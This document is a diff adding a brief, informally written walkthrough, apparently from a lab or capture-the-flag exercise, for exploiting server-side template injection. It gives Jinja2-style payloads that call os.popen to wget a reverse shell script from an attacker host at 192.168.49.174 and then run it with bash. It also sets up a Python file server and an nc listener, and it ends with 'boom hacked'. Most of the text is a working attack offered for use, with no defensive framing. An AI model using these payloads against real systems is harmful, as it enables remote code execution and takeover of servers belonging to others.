@@ -1,0 +1,44 @@
+this vulnerability is diffrent to remote code execution
+
+how to exploit
+
+http://example.com:port/?id=blabla
+
+this is a normal link 
+
+now we exploit it 
+
+create a reverse shell with msfvenom for powerfull used 
+
+
+now we start a server with python 
+
+python3 -m http.server 8000
+
+nc victimip victimport
+
+> open
+title : {{config.__class__.__init__.__globals__['os'].popen('wget http://192.168.49.174:8000/revshell.sh -O /tmp/revshell.sh').read()}}
+discription : {{config.__class__.__init__.__globals__['os'].popen('wget http://192.168.49.174:8000/revshell.sh -O /tmp/revshell.sh').read()}}
+
+this is inject a reverse shell 
+now we run the reverse shell with nc help for listener 
+
+>open
+title : {{config.__class__.__init__.__globals__['os'].popen('bash /tmp/revshell.sh').read()}}
+discription : {{config.__class__.__init__.__globals__['os'].popen('bash /tmp/revshell.sh').read()}}
+
+now start the listener with nc 
+
+nc -lvnp 4444
+
+now we open a link 
+
+http://example.com:port
+
+now you see your paylods and running code
+
+now you click first 
+and back and click second run code 
+
+boom hacked 
